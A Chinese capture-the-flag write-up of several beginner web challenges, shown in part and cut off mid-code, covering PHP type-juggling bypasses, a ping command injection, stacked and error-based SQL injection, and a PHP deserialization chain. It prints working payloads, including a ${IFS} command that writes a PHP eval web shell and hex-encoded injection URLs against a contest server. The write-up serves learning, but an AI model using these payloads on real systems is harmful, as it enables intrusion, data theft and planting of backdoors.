<h2 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h2><p>F12查看源码，main.js文件里有flag<br><img src="https://img-blog.csdnimg.cn/0f8d7e6202574ec0a759d419ed97bf7b.png" alt="1"></p>
<h2 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// flag in flag.php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span> <span class="token operator">!=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>先进行数组绕过a,b。name可以使用php伪协议进行读取<code>php://filter/convert.base64-encode/resource=flag</code>。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span> <span class="token operator">!=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1024</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>c传入1024.1a即可绕过。</p>
<h2 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h2><p>问你啥你写啥就行了。。。</p>
<h2 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h2><p><img src="https://img-blog.csdnimg.cn/4a66a3f4f0c949cc82de767ad82aa088.png" alt="1"><br>是一个ping题目，查看源码<br><strong>&#x2F;api.php?source</strong><br><img src="https://img-blog.csdnimg.cn/d5e483c94b15420989adff91a42f44bb.png" alt="1"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">sanitize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No IP Address'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//就是辨别ip地址十进制是否合法</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid IP Address'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ping -c 4 '</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span> <span class="token string single-quoted-string">' 2>&amp;1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>重点是ip传入的值<br><img src="https://img-blog.csdnimg.cn/0000633d27ea4222bd497e48dc1922be.png" alt="2"><br>也可以使用<code>ip=127.0.0.1|ls``ip=127.0.0.10000||ls</code><br><img src="https://img-blog.csdnimg.cn/480d98ce0ba9467fa140c77c5dd89dd9.png" alt="1"><br>由于过滤的有内容，空格可使用<code>$&#123;IFS&#125;</code>代替，使用base64编码写入一句话木马</p>
<blockquote>
<p><code>echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2N0ZiddKTsgPz4=|base64$&#123;IFS&#125;-d&gt;&gt;513.php</code></p>
</blockquote>
<p>连接蚁剑拿到flag。<br><img src="https://img-blog.csdnimg.cn/f521f056cd724f2f8e85d9b2a945a12f.png" alt="1"></p>
<h2 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="[Week 2] ez_sqli"></a>[Week 2] ez_sqli</h2><p>知识点：SQL注入（堆叠注入、报错注入、预处理）<br>提示：<br><img src="https://img-blog.csdnimg.cn/ea2dbfeb1c804919a79f91fb8cd2e71c.png" alt="1"><br>查看禁用函数,fuzz一下，发现以下字符被过滤。<br><img src="https://img-blog.csdnimg.cn/a575a24b97be4713ba7423ed92ff0f9e.png" alt="1"></p>
<p><a href="https://www.cnblogs.com/geaozhang/p/9891338.html">MySQL的SQL预处理(Prepared)</a><br><a href="https://www.cnblogs.com/c1047509362/p/12806297.html">SQL注入实战之报错注入篇（updatexml extractvalue floor）</a></p>
<p>借一位师傅的脚本</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C646174616261736528292929;prepare/**/aaa/**/from @c;execute/**/aaa;</span>

<span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> Group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">=</span> <span class="token string">'ctf'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2853454C4543542047726F75705F636F6E636174287461626C655F6E616D65292046524F4D20696E666F726D6174696F6E5F736368656D612E7461626C6573205748455245207461626C655F736368656D61203D2027637466272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span>

MySQLdb<span class="token punctuation">.</span>OperationalError: <span class="token punctuation">(</span><span class="token number">1105</span><span class="token punctuation">,</span> <span class="token string">"XPATH syntax error: '~~flag,userinfo'"</span><span class="token punctuation">)</span>



<span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='ctf' and table_name='flag')));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F736368656D613D276374662720616E64207461626C655F6E616D653D27666C6167272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span>

<span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>first_name<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>last_name<span class="token punctuation">)</span> <span class="token keyword">from</span> dvwa<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">)</span>

hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,(select flag from ctf.flag)));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,substr((select flag from ctf.flag),29,30)));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token number">0</span>xGame&#123;<span class="token number">4286</span>b62d<span class="token operator">-</span>c37e<span class="token operator">-</span><span class="token number">4010</span><span class="token operator">-</span>ba9c<span class="token operator">-</span><span class="token number">35</span>d47641fb91&#125;

http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C737562737472282873656C65637420666C61672066726F6D206374662E666C6167292C32392C33302929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h2><p>考点：php反序列化pop链构造、wakeup的绕过。<br>不会，看的官方wp。。。<br><img src="https://img-blog.csdnimg.cn/4e1821de9476443b80fcf1ee06488bd7.png" alt="提示"><br>贴上源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>

        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span><span class="token operator">-></span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">storage</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先找到入口<code>__destruct()</code>，在<code>DataObject 类里</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">storage</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里会遍历data的内容，将key和value赋值给storage，触发 Storage 的 <code>__set</code> 方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里如果<code>$store</code>为空，那么就初始化一个空的array()，下一个if语句就是调用value的expire方法，如果返回false就将value放入store中。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>

